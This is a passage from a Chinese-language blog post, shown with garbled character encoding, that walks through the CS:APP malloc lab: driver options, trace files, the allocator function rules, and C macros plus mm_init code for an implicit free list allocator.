    <content type="html"><![CDATA[<h1 id="labè¯´æ˜"><a href="#labè¯´æ˜" class="headerlink" title="labè¯´æ˜"></a>labè¯´æ˜</h1><blockquote><p>ä¸‹é¢æ˜¯å¯¹labè¯´æ˜æ–‡æ¡£çš„æ€»ç»“</p></blockquote><h2 id="è¯„æµ‹"><a href="#è¯„æµ‹" class="headerlink" title="è¯„æµ‹"></a>è¯„æµ‹</h2><p>åœ¨<code>malloclab-handout.tar</code>å‘è¡Œç‰ˆä¸­çš„é©±åŠ¨ç¨‹åº<code>mdriver.c</code>å°†æµ‹è¯•<code>mm.c</code>åŒ…çš„æ­£ç¡®æ€§ã€ç©ºé—´åˆ©ç”¨ç‡å’Œååé‡ã€‚é©±åŠ¨ç¨‹åºç”±ä¸€ç»„è·Ÿè¸ªæ–‡ä»¶æ§åˆ¶ï¼Œè¿™äº›æ–‡ä»¶åŒ…å«åœ¨<code>malloclab-handout.tar</code>åˆ†å‘ç‰ˆä¸­ã€‚æ¯ä¸ªè·Ÿè¸ªæ–‡ä»¶éƒ½åŒ…å«ä¸€ç³»åˆ—åˆ†é…ã€é‡æ–°åˆ†é…å’Œé‡Šæ”¾æŒ‡ä»¤ï¼ŒæŒ‡ç¤ºé©±åŠ¨ç¨‹åºä»¥æŸç§é¡ºåºè°ƒç”¨æ‚¨çš„<code>mm_malloc</code>ã€<code>mm_realloc</code>å’Œ<code>mm_free</code>ä¾‹ç¨‹ã€‚é©±åŠ¨ç¨‹åºå’Œè·Ÿè¸ªæ–‡ä»¶ä¸æˆ‘ä»¬ä¸ºæ‚¨çš„æäº¤<code>mm.c</code>æ–‡ä»¶è¯„åˆ†æ—¶å°†ä½¿ç”¨çš„ç›¸åŒã€‚</p><p>é©±åŠ¨ç¨‹åº<code>mdriver.c</code>æ¥å—ä»¥ä¸‹å‘½ä»¤è¡Œå‚æ•°ï¼š</p><ul><li><code>-t &lt;tracedir&gt;</code>ï¼šåœ¨ç›®å½•<code>tracedir</code>è€Œä¸æ˜¯<code>config.h</code>ä¸­å®šä¹‰çš„é»˜è®¤ç›®å½•ä¸­æŸ¥æ‰¾é»˜è®¤è·Ÿè¸ªæ–‡ä»¶ã€‚</li><li><code>-f &lt;tracefile&gt;</code>ï¼šä½¿ç”¨ä¸€ä¸ªç‰¹å®šçš„è·Ÿè¸ªæ–‡ä»¶ä»£æ›¿é»˜è®¤çš„è·Ÿè¸ªæ–‡ä»¶é›†è¿›è¡Œæµ‹è¯•ã€‚</li><li><code>-h</code>ï¼šæ‰“å°å‘½ä»¤è¡Œå‚æ•°çš„æ‘˜è¦ã€‚</li><li><code>-l</code>ï¼šé™¤äº†å­¦ç”Ÿçš„<code>malloc</code>åŒ…ä¹‹å¤–ï¼Œè¿˜è¿è¡Œå’Œæµ‹é‡<code>libc malloc</code>ã€‚</li><li><code>-v</code>ï¼šè¯¦ç»†è¾“å‡ºã€‚åœ¨ç´§å‡‘è¡¨ä¸­æ‰“å°æ¯ä¸ªè·Ÿè¸ªæ–‡ä»¶çš„æ€§èƒ½åˆ†è§£ã€‚</li><li><code>-V</code>ï¼šæ›´è¯¦ç»†çš„è¾“å‡ºã€‚åœ¨å¤„ç†æ¯ä¸ªè·Ÿè¸ªæ–‡ä»¶æ—¶æ‰“å°é™„åŠ è¯Šæ–­ä¿¡æ¯ã€‚å¯¹äºç¡®å®šå“ªä¸ªè·Ÿè¸ªæ–‡ä»¶å¯¼è‡´æ‚¨çš„<code>malloc</code>åŒ…å¤±è´¥å¾ˆæœ‰ç”¨ã€‚</li></ul><p>è¿è¡Œ<code>./mdriver -t ./traces -v</code>ï¼Œå³å¯ä½¿ç”¨æŒ‡å®šçš„traceæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶è¿›è¡Œè¯„æµ‹ï¼Œ-væ‰“å°æ€§èƒ½è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">make clean<br><br>make <br><br>./mdriver -t ./traces -v<br></code></pre></td></tr></table></figure><p>åŸå§‹ä»£ç çš„è¯„æµ‹è¾“å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ./mdriver -t ./traces -v<br>Team Name:ateam<br>Member <span class="hljs-number">1</span> :Harry Bovik:bovik@cs.cmu.edu<br>Using <span class="hljs-keyword">default</span> tracefiles in ./traces/<br><span class="hljs-function">Measuring performance with <span class="hljs-title">gettimeofday</span><span class="hljs-params">()</span>.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 4, line 7673]: mm_malloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 5, line 1662]: mm_malloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 6, line 1780]: mm_malloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 9, line 1705]: mm_realloc failed.</span><br><span class="hljs-function">ERROR: mem_sbrk failed. Ran out of memory...</span><br><span class="hljs-function">ERROR [trace 10, line 6562]: mm_realloc failed.</span><br><span class="hljs-function"></span><br><span class="hljs-function">Results <span class="hljs-keyword">for</span> mm <span class="hljs-built_in">malloc</span>:</span><br><span class="hljs-function">trace  valid  util     ops      secs  Kops</span><br><span class="hljs-function"> 0       yes   23%    5694  0.000021268585</span><br><span class="hljs-function"> 1       yes   19%    5848  0.000018332273</span><br><span class="hljs-function"> 2       yes   30%    6648  0.000020339184</span><br><span class="hljs-function"> 3       yes   40%    5380  0.000015349351</span><br><span class="hljs-function"> 4        no     -       -         -     -</span><br><span class="hljs-function"> 5        no     -       -         -     -</span><br><span class="hljs-function"> 6        no     -       -         -     -</span><br><span class="hljs-function"> 7       yes   55%   12000  0.000031382166</span><br><span class="hljs-function"> 8       yes   51%   24000  0.000070340909</span><br><span class="hljs-function"> 9        no     -       -         -     -</span><br><span class="hljs-function">10        no     -       -         -     -</span><br><span class="hljs-function">Total            -       -         -     -</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹short1-bal.repæ–‡ä»¶çš„å†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">20000</span><br><span class="hljs-attribute">6</span><br><span class="hljs-attribute">12</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">0</span> <span class="hljs-number">2040</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">1</span> <span class="hljs-number">2040</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">2</span> <span class="hljs-number">48</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">3</span> <span class="hljs-number">4072</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">4</span> <span class="hljs-number">4072</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">5</span> <span class="hljs-number">4072</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">f</span> <span class="hljs-number">5</span><br><br></code></pre></td></tr></table></figure><h2 id="å‡½æ•°è¯´æ˜"><a href="#å‡½æ•°è¯´æ˜" class="headerlink" title="å‡½æ•°è¯´æ˜"></a>å‡½æ•°è¯´æ˜</h2><p>mm.cä¸­æœ‰ä¸‹é¢å‡ ä¸ªå‡½æ•°ï¼š</p><p>mm_initï¼šæ‰§è¡Œä»»ä½•å¿…è¦çš„åˆå§‹åŒ–</p><p>mm_mallocï¼šmm_malloc ä¾‹ç¨‹è¿”å›æŒ‡å‘è‡³å°‘ size ä¸ªå­—èŠ‚çš„å·²åˆ†é…å—æœ‰æ•ˆè½½è·çš„æŒ‡é’ˆã€‚æ•´ä¸ªåˆ†é…çš„å—åº”è¯¥ä½äºå †åŒºåŸŸå†…å¹¶ä¸”ä¸åº”è¯¥ä¸ä»»ä½•å…¶ä»–åˆ†é…çš„å—é‡å ã€‚ç”±äº libc malloc å§‹ç»ˆè¿”å›ä¸ 8 å­—èŠ‚å¯¹é½çš„æœ‰æ•ˆè´Ÿè½½æŒ‡é’ˆï¼Œå› æ­¤æ‚¨çš„ malloc å®ç°ä¹Ÿåº”è¯¥è¿™æ ·åšå¹¶å§‹ç»ˆè¿”å› 8 å­—èŠ‚å¯¹é½çš„æŒ‡é’ˆã€‚</p><p>mm_freeï¼šmm_free ä¾‹ç¨‹é‡Šæ”¾ ptr æŒ‡å‘çš„å—ã€‚å®ƒä»€ä¹ˆéƒ½ä¸è¿”å›ã€‚åªæœ‰åœ¨å…ˆå‰è°ƒç”¨ mm_malloc æˆ– mm_realloc è¿”å›ä¼ é€’çš„æŒ‡é’ˆ (ptr) ä¸”å°šæœªé‡Šæ”¾æ—¶ï¼Œæ­¤ä¾‹ç¨‹æ‰èƒ½ä¿è¯å·¥ä½œã€‚</p><p>mm_reallocï¼šmm_realloc(void *ptr, size_t size) ä¾‹ç¨‹è¿”å›ä¸€ä¸ªæŒ‡å‘è‡³å°‘ size ä¸ªå­—èŠ‚çš„å·²åˆ†é…åŒºåŸŸçš„æŒ‡é’ˆ</p><p>memlib.cä¸­æœ‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„å‡½æ•°</p><ul><li><code>void *mem_sbrk(int incr)</code>: å°†å †æ‰©å±•<code>incr</code>å­—èŠ‚ï¼Œå…¶ä¸­<code>incr</code>æ˜¯æ­£éé›¶æ•´æ•°ï¼Œå¹¶è¿”å›æŒ‡å‘æ–°åˆ†é…çš„å †åŒºåŸŸçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„é€šç”¨æŒ‡é’ˆã€‚è¯­ä¹‰ä¸Unixâ€™sbrkå‡½æ•°ç›¸åŒï¼Œé™¤äº†<code>mem_sbrk</code>åªæ¥å—æ­£çš„éé›¶æ•´æ•°å‚æ•°ã€‚</li><li><code>void *mem_heap_lo(void)</code>: è¿”å›æŒ‡å‘å †ä¸­ç¬¬ä¸€ä¸ªå­—èŠ‚çš„é€šç”¨æŒ‡é’ˆã€‚</li><li><code>void *mem_heap_hi(void)</code>: è¿”å›æŒ‡å‘å †ä¸­æœ€åä¸€ä¸ªå­—èŠ‚çš„é€šç”¨æŒ‡é’ˆã€‚</li><li><code>size_t mem_heapsize(void)</code>: è¿”å›å †çš„å½“å‰å¤§å°(ä»¥å­—èŠ‚ä¸ºå•ä½)ã€‚</li><li><code>size_t mem_pagesize(void)</code>: è¿”å›ç³»ç»Ÿçš„é¡µé¢å¤§å°(ä»¥å­—èŠ‚ä¸ºå•ä½)(Linuxç³»ç»Ÿä¸º4K)ã€‚</li></ul><h2 id="ç¼–ç¨‹è§„åˆ™"><a href="#ç¼–ç¨‹è§„åˆ™" class="headerlink" title="ç¼–ç¨‹è§„åˆ™"></a>ç¼–ç¨‹è§„åˆ™</h2><ul><li>æ‚¨ä¸åº”æ›´æ”¹<code>mm.c</code>ä¸­çš„ä»»ä½•æ¥å£ã€‚</li><li>æ‚¨ä¸åº”è°ƒç”¨ä»»ä½•ä¸å†…å­˜ç®¡ç†ç›¸å…³çš„åº“è°ƒç”¨æˆ–ç³»ç»Ÿè°ƒç”¨ã€‚è¿™ä¸åŒ…æ‹¬åœ¨æ‚¨çš„ä»£ç ä¸­ä½¿ç”¨<code>malloc</code>ã€<code>calloc</code>ã€<code>free</code>ã€<code>realloc</code>ã€<code>sbrk</code>ã€<code>brk</code>æˆ–è¿™äº›è°ƒç”¨çš„ä»»ä½•å˜ä½“ã€‚</li><li>æ‚¨ä¸å¾—åœ¨<code>mm.c</code>ç¨‹åºä¸­å®šä¹‰ä»»ä½•å…¨å±€æˆ–é™æ€å¤åˆæ•°æ®ç»“æ„ï¼Œä¾‹å¦‚æ•°ç»„ã€ç»“æ„ã€æ ‘æˆ–åˆ—è¡¨ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥åœ¨<code>mm.c</code>ä¸­å£°æ˜å…¨å±€æ ‡é‡å˜é‡ï¼Œä¾‹å¦‚æ•´æ•°ã€æµ®ç‚¹æ•°å’ŒæŒ‡é’ˆã€‚</li><li>ä¸ºäº†ä¸è¿”å›8å­—èŠ‚è¾¹ç•Œå¯¹é½çš„å—çš„<code>libc malloc</code>åŒ…ä¿æŒä¸€è‡´ï¼Œæ‚¨çš„åˆ†é…å™¨å¿…é¡»å§‹ç»ˆè¿”å›ä¸8å­—èŠ‚è¾¹ç•Œå¯¹é½çš„æŒ‡é’ˆã€‚é©±åŠ¨ç¨‹åºä¼šä¸ºæ‚¨å¼ºåˆ¶æ‰§è¡Œæ­¤è¦æ±‚ã€‚</li></ul><blockquote><p>åœ¨å®æ–½æ—¶ï¼Œå»ºè®®åˆ†é˜¶æ®µè¿›è¡Œã€‚å‰9ä¸ªè·Ÿè¸ªåŒ…å«å¯¹<code>malloc</code>å’Œ<code>free</code>çš„è¯·æ±‚ã€‚æœ€å2ä¸ªè·Ÿè¸ªåŒ…å«å¯¹<code>realloc</code>ã€<code>malloc</code>å’Œ<code>free</code>çš„è¯·æ±‚ã€‚æˆ‘ä»¬å»ºè®®æ‚¨é¦–å…ˆè®©æ‚¨çš„<code>malloc</code>å’Œ<code>free</code>ä¾‹ç¨‹åœ¨å‰9ä¸ªè·Ÿè¸ªä¸Šæ­£ç¡®æœ‰æ•ˆåœ°å·¥ä½œã€‚åªæœ‰è¿™æ ·ï¼Œæ‚¨æ‰åº”è¯¥å°†æ³¨æ„åŠ›è½¬ç§»åˆ°<code>realloc</code>å®ç°ä¸Šã€‚åˆå­¦è€…å¯ä»¥åœ¨ç°æœ‰çš„<code>malloc</code>å’Œ<code>free</code>å®ç°ä¹‹ä¸Šæ„å»º<code>realloc</code>ã€‚ä½†æ˜¯ï¼Œè¦è·å¾—çœŸæ­£å¥½çš„æ€§èƒ½ï¼Œæ‚¨éœ€è¦æ„å»ºä¸€ä¸ªç‹¬ç«‹çš„<code>realloc</code>ã€‚æœ€åï¼Œä½¿ç”¨åˆ†æå™¨(å¦‚gprof)å¯ä»¥å¸®åŠ©æ‚¨ä¼˜åŒ–æ€§èƒ½ã€‚</p></blockquote><h1 id="éšå¼ç©ºé—²é“¾è¡¨å®ç°"><a href="#éšå¼ç©ºé—²é“¾è¡¨å®ç°" class="headerlink" title="éšå¼ç©ºé—²é“¾è¡¨å®ç°"></a>éšå¼ç©ºé—²é“¾è¡¨å®ç°</h1><h2 id="å®"><a href="#å®" class="headerlink" title="å®"></a>å®</h2><p>ä¸ºäº†é™ä½å¤æ‚æ€§å¹¶å‡å°‘å¯èƒ½çš„é”™è¯¯ï¼Œå»ºè®®å°†æŒ‡é’ˆç®—æ³•å°è£…åœ¨Cé¢„å¤„ç†å™¨å®ä¸­ã€‚æ­£å¦‚ä¹¦ä¸­æåˆ°çš„ï¼Œå†…å­˜ç®¡ç†å™¨ä¸­çš„æŒ‡é’ˆç®—æ³•ä»¤äººå›°æƒ‘ä¸”å®¹æ˜“å‡ºé”™ï¼Œå¯ä»¥é€šè¿‡ä¸ºæŒ‡é’ˆæ“ä½œç¼–å†™å®æ¥æ˜¾ç€é™ä½å¤æ‚æ€§</p><table><thead><tr><th>å®åç§°</th><th>å®å®šä¹‰</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>GET</td><td><code>(*(unsigned int *)(p))</code></td><td>è¯»å–åœ°å€på¤„çš„unsigned intç±»å‹çš„å€¼</td></tr><tr><td>PUT</td><td><code>(*(unsigned int *)(p) = (val))</code></td><td>å°†unsigned intç±»å‹çš„å€¼valå­˜å‚¨åˆ°åœ°å€på¤„</td></tr><tr><td>GET_SIZE</td><td><code>(GET(p) &amp; ~0x7)</code></td><td>ä»åœ°å€på¤„è¯»å–unsigned intç±»å‹çš„å€¼ï¼Œå¹¶å¿½ç•¥æœ€åä¸‰ä½ï¼Œå¾—åˆ°å—çš„å¤§å°</td></tr><tr><td>GET_ALLOC</td><td><code>(GET(p) &amp; 0x1)</code></td><td>ä»åœ°å€på¤„è¯»å–unsigned intç±»å‹çš„å€¼ï¼Œå¹¶è·å–æœ€åä¸€ä½ï¼Œåˆ¤æ–­è¯¥å—æ˜¯å¦å·²åˆ†é…</td></tr><tr><td>HDRP</td><td><code>((char *)(bp) - WSIZE)</code></td><td>ç»™å®šå—æŒ‡é’ˆbpï¼Œè®¡ç®—å‡ºè¯¥å—çš„å¤´éƒ¨åœ°å€</td></tr><tr><td>FTRP</td><td><code>((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</code></td><td>ç»™å®šå—æŒ‡é’ˆbpï¼Œè®¡ç®—å‡ºè¯¥å—çš„è„šéƒ¨åœ°å€</td></tr><tr><td>NEXT_BLKP</td><td><code>((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</code></td><td>ç»™å®šå—æŒ‡é’ˆbpï¼Œè®¡ç®—å‡ºä¸‹ä¸€ä¸ªå—çš„åœ°å€</td></tr><tr><td>PREV_BLKP</td><td><code>((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</code></td><td>ç»™å®šå—æŒ‡é’ˆbpï¼Œè®¡ç®—å‡ºå‰ä¸€ä¸ªå—çš„åœ°å€</td></tr></tbody></table><p>ç†è§£ä¸Šé¢çš„å®çš„å‰ææ˜¯ç†è§£åˆ†é…çš„å †çš„å†…å­˜å—çš„ç»“æ„</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305312110226.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* single word (4) or double word (8) alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALIGNMENT 8</span><br><br><span class="hljs-comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7) <span class="hljs-comment">// ~0x7æ˜¯0xFFFFFFF8ï¼Œè¿™é‡Œå‘ä¸Šèˆå…¥åˆ° 8 çš„å€æ•°</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span><br><br><span class="hljs-comment">/* Basic constants and macros */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WSIZE 4             <span class="hljs-comment">/* Word and header/footer size (bytes) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DSIZE 8             <span class="hljs-comment">/* Double word size (bytes) æˆ–è€…ï¼Œheader+footerçš„å¤§å°*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="hljs-comment">/* Extend heap by this amount (bytes) 4096å­—èŠ‚*/</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span><br><br><span class="hljs-comment">/* Pack a size and allocated bit into a word */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span><br><br><span class="hljs-comment">/* è·å–påœ°å€å¤„ä¿å­˜çš„unsigned intçš„å€¼ Read and write a word at address p */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET(p) (*(unsigned int *)(p))</span><br><span class="hljs-comment">/* å°†valçš„å€¼ä»¥unsigned intå­˜å‚¨åˆ°påœ°å€å¤„*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (val))</span><br><br><span class="hljs-comment">/* è¯»å–påœ°å€å¤„ä¿å­˜çš„unsigned intçš„å€¼ï¼Œå¿½ç•¥æœ€åä¸‰ä½ Read the size and allocated fields from address p */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span><br><span class="hljs-comment">/* è·å–påœ°å€å¤„ä¿å­˜çš„unsigned intçš„å€¼çš„æœ€åä¸€ä½ï¼Œä¹Ÿå³è¯¥å—æ˜¯å¦åˆ†é…*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span><br><br><span class="hljs-comment">/* è·å–bpåœ°å€å¤„å¯¹åº”çš„å—çš„å¤´éƒ¨çš„æŒ‡é’ˆï¼Œchar *ç±»å‹ï¼Œbpï¼šå—æŒ‡é’ˆ  å‡ï¼šå¾€å¤´éƒ¨èµ° åŠ ï¼šå¾€è„šéƒ¨èµ° Given block ptr bp, compute address of its header and footer */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)</span><br><span class="hljs-comment">/* è·å–bpåœ°å€å¤„å¯¹åº”çš„å—çš„è„šéƒ¨çš„æŒ‡é’ˆï¼Œchar *ç±»å‹ï¼Œè¦æ³¨æ„ï¼Œå¤´/è„šéƒ¨ä¿å­˜çš„å¤§å°æ˜¯ä¸€æ•´ä¸ªå—ï¼ŒåŒ…å«å¤´è„šéƒ¨å’Œpayloadçš„æ‰€æœ‰çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span><br><br><span class="hljs-comment">/* è·å–bpåœ°å€å¤„å¯¹åº”çš„å—çš„ä¸‹ä¸€ä¸ªå—çš„å—æŒ‡é’ˆ Given block ptr bp, compute address of next and previous blocks */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span><br><span class="hljs-comment">/* è·å–bpåœ°å€å¤„å¯¹åº”çš„å—çš„å‰ä¸€ä¸ªå—çš„å—æŒ‡é’ˆ */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span><br><br></code></pre></td></tr></table></figure><h2 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">/* Create the initial empty heap */</span><br>    <span class="hljs-keyword">if</span> ((heap_listp = mem_sbrk(<span class="hljs-number">4</span> * WSIZE)) == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    PUT(heap_listp, <span class="hljs-number">0</span>);                            <span class="hljs-comment">/* Alignment padding */</span><br>    PUT(heap_listp + (<span class="hljs-number">1</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* åºè¨€å— å¤´éƒ¨ 8/1 Prologue header */</span><br>    PUT(heap_listp + (<span class="hljs-number">2</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* åºè¨€å— è„šéƒ¨ 8/1 Prologue footer */</span><br>    PUT(heap_listp + (<span class="hljs-number">3</span> * WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* å°¾å£°å— å¤´éƒ¨ 0/1 Epilogue header */</span><br>    heap_listp += (<span class="hljs-number">2</span> * WSIZE);<br><br>    <span class="hljs-comment">/* Extend the empty heap with a free block of CHUNKSIZE bytes */</span><br>    <span class="hljs-keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>mm_initå‡½æ•°è´Ÿè´£å †çš„åˆå§‹åŒ–å·¥ä½œ</p><p>mm_initå‡½æ•°å…ˆè°ƒç”¨mem_sbrkå‡½æ•°åˆ†é…å †çš„åˆå§‹ç©ºé—´ï¼Œå¤§å°ä¸º4ä¸ªå­—ï¼Œä¾æ¬¡æ˜¯</p><ul><li>padding</li><li>åºè¨€å— å¤´éƒ¨ 8/1 Prologue header</li><li>åºè¨€å— è„šéƒ¨ 8/1 Prologue footer</li><li>å°¾å£°å— å¤´éƒ¨ 0/1 Epilogue header</li></ul><p>ä¸‹é¢çœ‹ä¸€ä¸‹mem_sbrkå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mem_sbrk - simple model of the sbrk function. Extends the heap </span><br><span class="hljs-comment"> *    by incr bytes and returns the start address of the new area. In</span><br><span class="hljs-comment"> *    this model, the heap cannot be shrunk.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mem_sbrk</span><span class="hljs-params">(<span class="hljs-keyword">int</span> incr)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *old_brk = mem_brk;<br><br>    <span class="hljs-keyword">if</span> ( (incr &lt; <span class="hljs-number">0</span>) || ((mem_brk + incr) &gt; mem_max_addr)) &#123;<br>errno = ENOMEM;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ERROR: mem_sbrk failed. Ran out of memory...\n&quot;</span>);<br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>;<br>    &#125;<br>    mem_brk += incr;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)old_brk;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå †çš„èŒƒå›´æ˜¯é€šè¿‡mem_brké™åˆ¶çš„ï¼Œå †çš„å¢é•¿æœ¬è´¨ä¸Šæ˜¯å°†å…¨å±€å˜é‡mem_sbrkå¢åŠ incrä¸ªå­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> 